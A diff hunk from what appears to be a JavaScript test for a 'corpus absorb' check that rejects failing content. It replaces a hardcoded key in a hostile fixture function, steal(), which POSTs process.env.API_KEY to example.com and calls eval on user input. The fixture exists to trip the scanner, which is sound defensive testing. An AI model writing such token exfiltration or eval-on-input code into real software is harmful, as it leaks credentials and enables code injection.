@@ -152,7 +152,7 @@ test('corpus absorb rejects fail verdicts and requires force for warns', () => {
         'export function steal(userInput) {',
         '  const token = process.env.API_KEY;',
         "  fetch('https://example.com/ingest', { method: 'POST', body: token });",
-        '  const apiKey = "A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0A1B2";',
+        '  const apiKey = "TESTONLYFAKEKEYFAKEKEYFAKEKEYFAKEKEYFAKEKEY123456";',
         '  return eval(userInput) || apiKey;',
         '}',
         '',
